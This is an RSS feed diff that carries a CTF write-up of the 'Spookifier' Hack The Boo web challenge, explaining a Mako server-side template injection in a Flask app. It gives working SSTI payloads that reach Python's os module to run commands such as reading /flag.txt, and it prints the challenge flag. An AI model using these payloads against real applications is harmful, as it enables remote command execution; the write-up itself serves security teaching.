@@ -1,1 +1,97 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web on Soviet's CTF Write-UPs</title><link>/ctf/hacktheboo/web/</link><description>Recent content in Web on Soviet's CTF Write-UPs</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 03 Nov 2022 16:16:32 +0100</lastBuildDate><atom:link href="/ctf/hacktheboo/web/index.xml" rel="self" type="application/rss+xml"/><item><title>Spookifier</title><link>/ctf/hacktheboo/web/spookifier/</link><pubDate>Thu, 03 Nov 2022 16:16:32 +0100</pubDate><guid>/ctf/hacktheboo/web/spookifier/</guid><description>Test i elo</description><content>&lt;p>Test i elo&lt;/p></content></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web on Soviet's CTF Write-UPs</title><link>/ctf/hacktheboo/web/</link><description>Recent content in Web on Soviet's CTF Write-UPs</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 06 Nov 2022 19:25:08 +0100</lastBuildDate><atom:link href="/ctf/hacktheboo/web/index.xml" rel="self" type="application/rss+xml"/><item><title>Spookifier</title><link>/ctf/hacktheboo/web/spookifier/</link><pubDate>Sun, 06 Nov 2022 19:25:08 +0100</pubDate><guid>/ctf/hacktheboo/web/spookifier/</guid><description>Server-Side Template Injection vulnerability in flask application with Mako template system</description><content>&lt;section class="attachments">
+&lt;label>Attachments&lt;/label>
+&lt;div class="attachments-files">&lt;ul>&lt;li>
+&lt;a class="tooltipped tooltipped-n" aria-label="Download" href="/ctf/hacktheboo/web/spookifier/files/web_spookifier.zip" download>web_spookifier.zip&lt;/a>
+&lt;a class="new-tab tooltipped tooltipped-n" aria-label="Open in new tab" href="/ctf/hacktheboo/web/spookifier/files/web_spookifier.zip" target="_blank">&lt;/a> &lt;div class="attachment-size">(30kb)&lt;/div>
+&lt;/li>&lt;/ul>
+&lt;/div>
+&lt;/section>
+&lt;h1 id="spookifier">Spookifier&lt;/h1>
+&lt;blockquote>
+&lt;p>There&amp;rsquo;s a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?&lt;/p>
+&lt;/blockquote>
+&lt;h1 id="information-gathering">Information Gathering&lt;/h1>
+&lt;h2 id="the-application-at-a-glance-">The application at-a-glance 🔍&lt;/h2>
+&lt;p>Appication generate &amp;ldquo;SpooOOooOOooooooOookkkkkyyyyy&amp;rdquo; names from user input.&lt;/p>
+&lt;p>&lt;img src="images/0.png" alt="Untitled">&lt;/p>
+&lt;p>&lt;img src="images/1.png" alt="Untitled">&lt;/p>
+&lt;h2 id="source-code-review">Source code review&lt;/h2>
+&lt;p>All source code was supplied but only relevant parts will be highlighted.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#main.py&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> flask &lt;span style="color:#f92672">import&lt;/span> Blueprint, request
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> flask_mako &lt;span style="color:#f92672">import&lt;/span> render_template
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> application.util &lt;span style="color:#f92672">import&lt;/span> spookify
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>web &lt;span style="color:#f92672">=&lt;/span> Blueprint(&lt;span style="color:#e6db74">&amp;#39;web&amp;#39;&lt;/span>, __name__)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@web&lt;/span>&lt;span style="color:#f92672">.&lt;/span>route(&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">index&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> text &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>args&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;text&amp;#39;&lt;/span>) &lt;span style="color:#75715e"># Here &amp;#34;text&amp;#34; is user input&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(text):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> converted &lt;span style="color:#f92672">=&lt;/span> spookify(text) &lt;span style="color:#75715e"># And is passed to spookify func without any sanityzation&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> render_template(&lt;span style="color:#e6db74">&amp;#39;index.html&amp;#39;&lt;/span>,output&lt;span style="color:#f92672">=&lt;/span>converted)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> render_template(&lt;span style="color:#e6db74">&amp;#39;index.html&amp;#39;&lt;/span>,output&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)a
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In &lt;code>main.py&lt;/code> file &lt;code>text&lt;/code> parameter from URL is directly passed to &lt;code>spookify&lt;/code> function without sanityzation. After function &lt;code>spookify&lt;/code> return it is rendered as template.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">spookify&lt;/span>(text):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> converted_fonts &lt;span style="color:#f92672">=&lt;/span> change_font(text_list&lt;span style="color:#f92672">=&lt;/span>text)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> generate_render(converted_fonts&lt;span style="color:#f92672">=&lt;/span>converted_fonts)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>spookify&lt;/code> function calls &lt;code>change_font&lt;/code> func and passed &lt;code>text&lt;/code> parameter still no sanitization. After &lt;code>change_font&lt;/code> return it is rendered and returned.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">change_font&lt;/span>(text_list):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> text_list &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#f92672">*&lt;/span>text_list]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> current_font &lt;span style="color:#f92672">=&lt;/span> []
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> all_fonts &lt;span style="color:#f92672">=&lt;/span> []
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">lambda&lt;/span> text,font_type : (
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [current_font&lt;span style="color:#f92672">.&lt;/span>append(globals()[font_type]&lt;span style="color:#f92672">.&lt;/span>get(i, &lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> text], all_fonts&lt;span style="color:#f92672">.&lt;/span>append(&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(current_font)), current_font&lt;span style="color:#f92672">.&lt;/span>clear()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ) &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list(text_list, &lt;span style="color:#e6db74">&amp;#39;font1&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list(text_list, &lt;span style="color:#e6db74">&amp;#39;font2&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list(text_list, &lt;span style="color:#e6db74">&amp;#39;font3&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_font_to_list(text_list, &lt;span style="color:#e6db74">&amp;#39;font4&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> all_fonts
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Function &lt;code>change_font&lt;/code> still do not sanitizate data.&lt;/p>
+&lt;h1 id="the-bug">The Bug&lt;/h1>
+&lt;p>Application lack sanitization. User input is directly passed to template engine allowing to SSTI (Server Side Template Injection) attack to happend.&lt;/p>
+&lt;h1 id="exploitation">Exploitation&lt;/h1>
+&lt;h2 id="execution">Execution&lt;/h2>
+&lt;p>Payload: &lt;code>${self.module.cache.util.os.popen(&amp;quot;cat+/flag.txt&amp;quot;).read()}&lt;/code>&lt;/p>
+&lt;p>&lt;a href="https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/">Python context free payloads in Mako templates&lt;/a>&lt;/p>
+&lt;p>&lt;img src="images/Untitled%202.png" alt="Untitled">&lt;/p>
+&lt;h2 id="explanation">Explanation&lt;/h2>
+&lt;h3 id="why-this-is-even-possible">Why this is even possible?&lt;/h3>
+&lt;p>Application fully trust user to not supply any malicious input. By that do not validate input data. This allows attacker or any malicious actor to take advantage of running application.&lt;/p>
+&lt;h3 id="payload">Payload&lt;/h3>
+&lt;p>&lt;code>${self.module.cache.util.os.popen(&amp;quot;cat+/flag.txt&amp;quot;).read()}&lt;/code>&lt;/p>
+&lt;p>To understand why code execute and why it looks slightly different from article mentioned earlier payload could be understand as:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>self&lt;/code> this references module that legitimate code execute output of &lt;code>${self}&lt;/code> is &lt;code>&amp;lt;mako.runtime.TemplateNamespace object at 0x7f93963278b0&amp;gt;&lt;/code>&lt;/li>
+&lt;li>&lt;code>module&lt;/code> this is current loaded module &lt;code>&amp;lt;module 'memory:0x7f93961eec70'&amp;gt;&lt;/code>&lt;/li>
+&lt;li>&lt;code>cache&lt;/code> is &lt;code>mako&lt;/code> template function module &lt;code>&amp;lt;module 'mako.cache' from '/usr/local/lib/python3.8/site-packages/mako/cache.py'&amp;gt;&lt;/code>&lt;/li>
+&lt;li>&lt;code>util&lt;/code> is another mako module and it is importig &lt;code>os&lt;/code> module built-in python module allowing to execute shell commands&lt;/li>
+&lt;li>&lt;code>os&lt;/code> this allows to execute commands on system &lt;code>&amp;lt;module 'os' from '/usr/local/lib/python3.8/os.py'&amp;gt;&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>All those modules are imported like &lt;code>self&lt;/code> importnig &lt;code>module&lt;/code>, &lt;code>module&lt;/code> importing cache etc.&lt;/p>
+&lt;p>By this time payload looks something like &lt;code>${self.module.cache.util.os}&lt;/code> which translate&lt;/p>
+&lt;p>From module I currently execute code go to one of my imports &lt;code>module&lt;/code> from that go to one of module imports named &lt;code>cache&lt;/code> from &lt;code>cache&lt;/code> go to his &lt;code>util&lt;/code> imports, from that go to &lt;code>os&lt;/code> import.&lt;/p>
+&lt;p>From that point there is possibility to use all functions from &lt;code>os&lt;/code> built-in library.&lt;/p>
+&lt;p>For example &lt;code>system()&lt;/code> so full payload looks: &lt;code>${self.module.cache.util.os.system('id')}&lt;/code>&lt;/p>
+&lt;p>&lt;img src="images/Untitled%203.png" alt="Untitled">&lt;/p>
+&lt;p>And it returned 0. Looks like root right? Not exactly.&lt;/p>
+&lt;p>If command is &lt;code>whoami&lt;/code> it is still 0. Python system command return &lt;code>exit code&lt;/code> not exactly of command output.&lt;/p>
+&lt;p>&lt;img src="images/Untitled%204.png" alt="Untitled">&lt;/p>
+&lt;p>To read &lt;code>stdout&lt;/code> of executed command &lt;code>popen()&lt;/code> function need to be used.&lt;/p>
+&lt;p>With payload as: &lt;code>${self.module.cache.util.os.popen('whoami')}&lt;/code>&lt;/p>
+&lt;p>We got something different &lt;code>os object&lt;/code>&lt;/p>
+&lt;p>&lt;code>read()&lt;/code> function can be used to get output we want.&lt;/p>
+&lt;p>&lt;img src="images/Untitled%205.png" alt="Untitled">&lt;/p>
+&lt;p>With payload as: &lt;code>${self.module.cache.util.os.popen('whoami').read()}&lt;/code>&lt;/p>
+&lt;p>&lt;img src="images/Untitled%206.png" alt="Untitled">&lt;/p>
+&lt;p>In &lt;code>Docker&lt;/code> file flag is copied to &lt;code>/flag.txt&lt;/code>&lt;/p>
+&lt;p>With paylaod as: &lt;code>${self.module.cache.util.os.popen('cat+/flag.txt').read()}&lt;/code>&lt;/p>
+&lt;p>&lt;img src="images/Untitled%207.png" alt="Untitled">&lt;/p>
+&lt;h1 id="flag">Flag&lt;/h1>
+&lt;p>&lt;code>HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}&lt;/code>&lt;/p></content></item></channel></rss>
